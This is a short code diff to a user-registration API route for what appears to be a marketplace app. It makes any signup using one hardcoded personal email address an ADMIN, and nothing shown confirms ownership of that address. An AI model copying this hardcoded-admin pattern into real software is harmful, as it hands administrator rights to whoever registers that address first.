@@ -33,17 +33,19 @@ export async function POST(request: Request) {
       );
     }
 
+    const normalizedEmail = email.toLowerCase().trim();
     const passwordHash = await hashPassword(password);
+    const isSuperAdmin = normalizedEmail === 'mslhfr1999@gmail.com';
 
     const newUser = await prisma.user.create({
       data: {
         name: fullName.trim(),
-        email: email.toLowerCase().trim(),
+        email: normalizedEmail,
         passwordHash,
         phone: phone || null,
         address: address || null,
         accountType: accountType || 'PERSONAL',
-        role: 'AUTHOR', // Default role for Rongtuli marketplace users
+        role: isSuperAdmin ? 'ADMIN' : 'AUTHOR',
       },
     });
 
